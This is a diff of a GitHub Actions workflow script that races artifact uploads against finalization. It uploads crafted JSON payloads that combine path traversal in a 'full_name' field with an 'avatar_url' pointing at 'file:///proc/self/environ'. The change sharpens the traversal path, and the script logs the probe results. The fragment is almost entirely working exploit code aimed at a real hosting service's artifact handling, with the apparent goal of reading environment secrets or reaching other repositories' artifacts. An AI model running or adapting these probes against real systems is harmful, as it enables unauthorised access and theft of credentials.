@@ -94,7 +94,7 @@ jobs:
               const firstUpload = await put(first.url, placeholder);
               const finalized = await finalize(artifactName, placeholder);
               const late = await create(artifactName, lateVersion, lateMime);
-              const payload = Buffer.from(JSON.stringify({full_name: `x/../${repo}/actions/artifacts/${finalized.id}/zip`, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: label, stargazers_count: 7}));
+              const payload = Buffer.from(JSON.stringify({full_name: `x/../../repos/${repo}/actions/artifacts/${finalized.id}/zip`, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: label, stargazers_count: 7}));
               const writes = await Promise.all([put(first.url, payload), put(late.url, payload)]);
               const download = await inspect(finalized.id, payload);
               core.info(`LATE_RESULT ${JSON.stringify({label, first: {...first, url: undefined}, firstUpload, finalized, late: {...late, url: undefined}, writes, download})}`);
@@ -124,9 +124,10 @@ jobs:
                   latePromise = create(artifactName, lateV, lateMime);
                 }
                 const [late, finalized] = await Promise.all([latePromise, finalPromise]);
-                const payload = Buffer.from(JSON.stringify({full_name: `x/../${repo}/actions/artifacts/${finalized.id}/zip`, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: `${direction}-${delay}`, stargazers_count: 7}));
+                const payload = Buffer.from(JSON.stringify({full_name: `x/../../repos/${repo}/actions/artifacts/${finalized.id}/zip`, owner: {login: 'probe', avatar_url: 'file:///proc/self/environ'}, description: `${direction}-${delay}`, stargazers_count: 7}));
                 const writes = await Promise.all([put(pre.url, payload), put(late.url, payload)]);
                 const download = await inspect(finalized.id, payload);
                 core.info(`RACE_RESULT ${JSON.stringify({direction, delay, pre: {...pre, url: undefined}, preUpload, late: {...late, url: undefined}, finalized, writes, download})}`);
               }
             }
+
